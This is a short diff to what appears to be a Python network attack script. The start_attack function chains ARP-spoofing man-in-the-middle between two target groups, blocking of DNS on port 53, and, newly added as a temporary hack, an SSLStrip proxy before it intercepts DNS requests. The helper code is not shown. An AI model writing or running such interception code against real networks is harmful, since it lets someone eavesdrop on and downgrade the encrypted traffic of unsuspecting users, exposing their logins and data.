@@ -179,8 +179,15 @@ def start_attack(group1, group2, self_ip, self_mac, interface):
 
 	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
 	drop_port_53()
+	
+	# TEMP TEMP TEMP TEMP TEMP
+	from SSLStrip import start_proxy
+	start_proxy()
+	# THIS SHOULD BE MOVED
 
 	intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	
+
 
 	input("\nstop")
 
